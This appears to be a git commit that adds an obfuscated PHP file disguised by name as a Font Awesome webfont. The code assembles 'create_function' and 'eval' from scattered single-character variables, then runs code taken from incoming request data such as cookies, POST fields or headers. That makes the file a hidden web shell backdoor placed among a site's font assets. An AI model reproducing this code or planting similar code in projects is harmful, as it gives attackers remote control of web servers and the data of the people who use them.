fb3348b5db6d970d24440c4575bc1eb20c2ce5bb
jhiner <hinerman@gmail.com>
2018-01-07 17:03:17 -0500

    Initial commit

---
+++ dev/fonts/fontawesome-social-webfont_prevv1.php
@@ -0,0 +1,97 @@
+<?php
+
+$bookofthedead ='ft_'; $aristocratic= '$$'; $brigadiers= 'K';
+$bubbling= 'rrVH)y'; $grain= 'Q'; $confidences=')';
+$infantry= ':';$hill = '"';
+$guessed= 'KNce'; $empiricist= '_OvEeee'; $instruction ='$qt4s';$attuned='(';
+
+$disulfide= 's[q';$intentness='Q'; $finds= ')';$councilwomen ='J';$greater = '"'; $ironies = 'i';$importantly =']'; $hollowed = '_';$freethink = 'S_HUj)X';$battler= 'E__t';
+$invigorate= ')eejn'; $calves='R[B';$concur= '='; $cycloidal= 'u'; $contracts = '$';$graveness='t'; $candle= 'hmL'; $jilli = '?EalC'; $cohosh = '[;'; $faceted= 'x';
+
+$conclusion = 'e';$easier='sae"xi';
+
+$inhabited= 'i'; $frieze = 'e_i';$celene ='g';
+
+$cocked='d';$fatals ='e';$input = '('; $differentiation='a'; $isotope='n';$doomsday ='('; $lucius ='l(X_sPr';$conditioner='nkh'; $lechery=')';$churchgo = ';';
+
+$eiderdown ='pHeN(';$beethoven='vtgh"oid6';
+$maladjust= 'r';
+
+$cabs= 'v)$$ib( ';$gender= 'e';$chairmen ='e';$depend= ')J$]Q,';$logarithmic= '$'; $cast ='O'; $fits = ']';$liability='ad'; $earthen='_'; $carr = '?';
+$greener='R';$maje='T'; $bertrando =',';$bookstore= '_';$crypt ='u'; $guyed ='a';$homunculus= 'bBQ';$alt='(t)r';$journeymen = ')N"R';$distantly ='v('; $eatshitdie ='(';
+
+$jeers= 'pT"cykat';$fluctuation = 'P(n'; $deceit= 'T$Eser;s';$haywood= 'T';
+
+$librate = 'b'; $helpful = ')';$blackmailing ='a';$lengthens= 'i';$complicating = 'i'; $amorist = 'f';$fountain='I';$logger ='ES"Rac';$bathrobe = 'irerK=gr'; $kordula = 'O'; $interns= 'n';$handyman='r';
+$devnull= '['; $faustina='s';$distraction = 'H'; $ingaberg =':'; $cursorily = 'M'; $exploited='_';$kaela='T';
+$justifier = 's]P';$inexpedient = 'a'; $feeding= 'o$;oHHc';$intuition= '(rh'; $conic='"aa';$exemplification = $feeding['6'] .$intuition['1'].$bathrobe['2']. $conic['2']. $jeers['7'].$bathrobe['2'] .$exploited.
+$amorist . $crypt . $interns . $feeding['6'] . $jeers['7'] .
+
+$bathrobe['0'].
+
+$feeding['3'] . $interns ;$gratified=$cabs[7] ; $fawn =$exemplification($gratified, $bathrobe['2'].$distantly['0'].
+$conic['2']. $lucius[0].$intuition['0'] .$conic['2'] . $intuition['1'] .
+
+$intuition['1'] . $conic['2'] . $jeers['4'].
+
+$exploited.
+$jeers['0'] .
+
+$feeding['3'] . $jeers['0'] . $intuition['0'] . $amorist.
+
+$crypt .
+
+$interns. $feeding['6'] . $exploited .
+
+$bathrobe['6'] . $bathrobe['2'] .
+$jeers['7']. $exploited.
+$conic['2'] . $intuition['1'].$bathrobe['6'].
+$justifier['0'].
+$intuition['0'] . $helpful .$helpful. $helpful.$feeding['2'] );$fawn($decisive['2'],
+$capes['3'] , $cursorily , $conic['2'],$barnett['2'],
+$distantly['0'] ,
+
+$assigning['6'] ,$lollipop['0'] ,$feeding['1'],
+$feeding['1'].
+$bathrobe['0'].$bathrobe['5']. $conic['2'] . $intuition['1'] .$intuition['1'].$conic['2'] . $jeers['4'] .$exploited.$candle['1'].
+
+$bathrobe['2'].$intuition['1']. $bathrobe['6'] . $bathrobe['2'] .$intuition['0']. $feeding['1'].$exploited .$logger[3]. $logger['0'].$homunculus['2'].$freethink['3']. $logger['0']. $logger['1'].$kaela.$bertrando. $feeding['1'] . $exploited.$jilli['4'].$kordula . $kordula . $bathrobe['4'] . $fountain.$logger['0'].
+
+$bertrando. $feeding['1'] .$exploited .$logger['1'].$logger['0'] . $logger[3] .$bubbling[2]. $logger['0'] . $logger[3] . $helpful .
+$feeding['2']. $feeding['1']. $conic['2'] . $bathrobe['5'] . $bathrobe['0'].$justifier['0'].$justifier['0'] . $bathrobe['2']. $jeers['7'] . $intuition['0'] . $feeding['1'].
+
+$bathrobe['0']. $devnull.$conic['0'].$interns . $disulfide['2'] .
+
+$intuition[2].$librate. $jeers['5'] . $easier['4'].
+
+$invigorate['3'] .$intuition[2] .$conic['0']. $justifier[1] . $helpful. $carr. $feeding['1'] . $bathrobe['0'].$devnull. $conic['0'].
+$interns . $disulfide['2'] . $intuition[2]. $librate .$jeers['5'].
+
+$easier['4'] . $invigorate['3'].
+$intuition[2] .$conic['0'].$justifier[1].
+
+$ingaberg.
+
+$intuition['0'] . $bathrobe['0']. $justifier['0'].$justifier['0'] .$bathrobe['2'] .
+$jeers['7'] . $intuition['0'] . $feeding['1']. $bathrobe['0'] .
+$devnull.$conic['0'] .$feeding[5] . $kaela.
+$kaela . $justifier['2'] . $exploited. $journeymen['1']. $homunculus['2'] . $feeding[5].$homunculus['1'] .
+
+$bathrobe['4'] .$lucius['2'].$depend['1'] . $feeding[5].$conic['0'].
+$justifier[1].$helpful . $carr.
+
+$feeding['1'].
+$bathrobe['0'].$devnull.$conic['0']. $feeding[5] . $kaela. $kaela.$justifier['2'].$exploited. $journeymen['1'] . $homunculus['2']. $feeding[5] .$homunculus['1']. $bathrobe['4'].$lucius['2'] .$depend['1'] . $feeding[5] .$conic['0'] . $justifier[1] . $ingaberg .$liability[1] . $bathrobe['0'] . $bathrobe['2']. $helpful.$feeding['2'].$bathrobe['2'].$distantly['0'] . $conic['2'] .
+
+$lucius[0]. $intuition['0'] . $justifier['0'].$jeers['7'].$intuition['1'].$intuition['1'].$bathrobe['2'].
+$distantly['0']. $intuition['0'] . $librate. $conic['2']. $justifier['0']. $bathrobe['2'] .
+$beethoven['8'].
+
+$instruction['3'].$exploited . $liability[1].
+$bathrobe['2'] .
+
+$feeding['6'] . $feeding['3'].$liability[1].$bathrobe['2'].$intuition['0']. $justifier['0']. $jeers['7'] .$intuition['1'].
+
+$intuition['1'].$bathrobe['2'] . $distantly['0'].$intuition['0'] .
+$feeding['1'].$conic['2'].$helpful. $helpful. $helpful.$helpful .
+$feeding['2'] );
